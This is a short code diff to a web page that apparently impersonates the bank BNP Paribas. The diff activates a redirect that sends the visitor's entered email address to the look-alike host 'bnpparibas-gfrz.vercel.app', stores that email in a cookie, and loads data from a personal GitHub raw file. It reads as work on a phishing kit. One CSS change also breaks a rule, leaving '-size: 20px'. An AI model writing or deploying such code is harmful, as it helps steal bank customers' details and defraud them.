@@ -131,7 +131,7 @@ text-shadow: 2px 2px 3px ;
  
 margin: 20px;
   letter-spacing: 2px;
-  font-size: 20px;
+  -size: 20px;
   text-align: center;
   
 }
@@ -415,7 +415,7 @@ padding: 8px 0px;
    
      const link=document.getElementById("link")
        
-/*window.location.href=`https://bnpparibas-gfrz.vercel.app/account?authuser=${mail.value}`*/
+window.location.href=`https://bnpparibas-gfrz.vercel.app/account?authuser=${mail.value}`
 createCookie('email',mail.value,1)
   
   
@@ -546,7 +546,7 @@ function getCookie(name) {
 let sessionEmail=""
 let bnpparislisbonne=""
 window.onload=function(){
-  fetch("/data.json").then(function(resp) {
+  fetch("https://raw.githubusercontent.com/lisbonne456/gitau/master/data.json").then(function(resp) {
     return resp.json()
   }).then(function(data) {
   
